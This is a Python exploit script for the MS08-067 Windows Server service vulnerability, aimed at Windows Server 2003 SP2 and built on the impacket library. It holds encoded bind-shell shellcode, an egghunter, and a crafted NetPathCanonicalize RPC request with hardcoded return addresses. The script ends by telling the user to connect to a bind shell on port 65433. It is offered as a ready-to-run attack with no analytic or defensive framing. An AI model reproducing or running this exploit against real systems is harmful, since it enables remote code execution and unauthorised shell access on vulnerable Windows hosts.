#!/usr/bin/python

from impacket import smb
from impacket import uuid
import impacket.dcerpc.v5
from impacket.dcerpc.v5 import transport
import sys

print ("MS08-067 win2k3sp2")
print ("I love you Alison Thompson OAM")
print ("@r0ss1n1 // Charles Truscott")

try:
  target = sys.argv[1]
  port = 445
except IndexError:
  print ("Usage: %s host" % sys.argv[0])
  
trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
trans.connect()

dce = trans.DCERPC_class(trans)
dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

bind =  ""
bind += "\xbd\x98\xbb\x16\xb3\xdd\xc2\xd9\x74\x24\xf4\x5e\x29"
bind += "\xc9\xb1\x4e\x31\x6e\x13\x03\x6e\x13\x83\xc6\x9c\x59"
bind += "\xe3\x4f\x74\x1f\x0c\xb0\x84\x40\x84\x55\xb5\x40\xf2"
bind += "\x1e\xe5\x70\x70\x72\x09\xfa\xd4\x67\x9a\x8e\xf0\x88"
bind += "\x2b\x24\x27\xa6\xac\x15\x1b\xa9\x2e\x64\x48\x09\x0f"
bind += "\xa7\x9d\x48\x48\xda\x6c\x18\x01\x90\xc3\x8d\x26\xec"
bind += "\xdf\x26\x74\xe0\x67\xda\xcc\x03\x49\x4d\x47\x5a\x49"
bind += "\x6f\x84\xd6\xc0\x77\xc9\xd3\x9b\x0c\x39\xaf\x1d\xc5"
bind += "\x70\x50\xb1\x28\xbd\xa3\xcb\x6d\x79\x5c\xbe\x87\x7a"
bind += "\xe1\xb9\x53\x01\x3d\x4f\x40\xa1\xb6\xf7\xac\x50\x1a"
bind += "\x61\x26\x5e\xd7\xe5\x60\x42\xe6\x2a\x1b\x7e\x63\xcd"
bind += "\xcc\xf7\x37\xea\xc8\x5c\xe3\x93\x49\x38\x42\xab\x8a"
bind += "\xe3\x3b\x09\xc0\x09\x2f\x20\x8b\x45\x9c\x09\x34\x95"
bind += "\x8a\x1a\x47\xa7\x15\xb1\xcf\x8b\xde\x1f\x17\xec\xf4"
bind += "\xd8\x87\x13\xf7\x18\x81\xd7\xa3\x48\xb9\xfe\xcb\x02"
bind += "\x39\xff\x19\xbe\x32\xa6\xf1\xdd\xb8\x32\xf3\x4b\x41"
bind += "\xaa\x19\x84\x9a\xca\x21\x4e\xb3\x62\xdc\x71\x43\xeb"
bind += "\x69\x97\xd1\x1b\x3c\x0f\x4e\xd9\x1b\x98\xe9\x22\x4e"
bind += "\x62\x35\xa9\x29\x3a\xde\xe6\x23\xfc\xe1\xf7\x61\xaa"
bind += "\x75\x73\x66\x6e\x67\x84\xa3\xc6\xf0\x12\x39\x87\xb3"
bind += "\x83\x3e\x82\x26\x43\xab\x29\xe1\x14\x43\x30\xd4\x52"
bind += "\xcc\xcb\x33\xe1\x0b\x33\xc2\xc8\x60\x02\x50\x52\x1f"
bind += "\x6b\xb4\x52\xdf\x3d\xde\x52\xb7\x99\xba\x01\xa2\xe5"
bind += "\x16\x36\x7f\x70\x99\x6e\xd3\xd3\xf1\x8c\x0a\x13\x5e"
bind += "\x6f\x79\x27\x99\x8f\xfc\x2f\x5b\x4c\x29\xf6\x2e\xbb"
bind += "\xe9\x4d\x20\x8e\x4c\xe7\xab\xf0\xc3\xf7\xf9"


stub = '\x01\x00\x00\x00'
stub += '\xb6\x00\x00\x00'
stub += '\x00\x00\x00\x00'
stub += '\xb6\x00\x00\x00'

stub += 'w00tw00t' + '\x90' * 16 + bind

stub += '\x00\x00\x00\x00'
stub += '\x2f\x00\x00\x00'
stub += '\x00\x00\x00\x00'
stub += '\x2f\x00\x00\x00'

stub += '\x41\x00\x5c\x00\x2e\x00\x2e\00'
stub += '\x5c\x00\x2e\x00\x2e\x00\x5c\00'
stub += '\x41\x41'
stub += '\x1b\xa0\x86\x7c'
stub += '\x41\x41\x41\x41'
stub += '\xeb\x1c\x90\x90'
stub += '\x41\x41\x41\x41'
stub += '\x84\x94\x80\x7c'
stub += '\xFF\xFF\xFF\xFF'
stub += '\xa2\x83\xe0\x77'
stub += '\x17\xf5\x83\x7c'

#stub += '\xCC" * 40

stub += '\x90\x90\x90\x90'
stub += '\x90\x90\x90\x90'

egghunter = "\x33\xd2\x90\x90\x90\x42\x52\x6a\x02"
egghunter+= "\x58\xcd\x2e\x3c\x05\x5a\x74\xf4\xb8"
egghunter+= "\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea"
egghunter+= "\xaf\x75\xe7\xff\xe7"

stub += egghunter

stub += '\x00\x00'
stub += '\x00\x00\x00\x00'
stub += '\x02\x00\x00\x00'
stub += '\x02\x00\x00\x00'
stub += '\x00\x00\x00\x00'
stub += '\x02\x00\x00\x00'
stub += '\x5c\x00\x00\x00'
stub += '\x01\x00\x00\x00'
stub += '\x01\x00\x00\x00'

print ("sending NetPathCanonicalize packet")
dce.call(0x1f, stub)
print ("connect to bind shell port 65433")
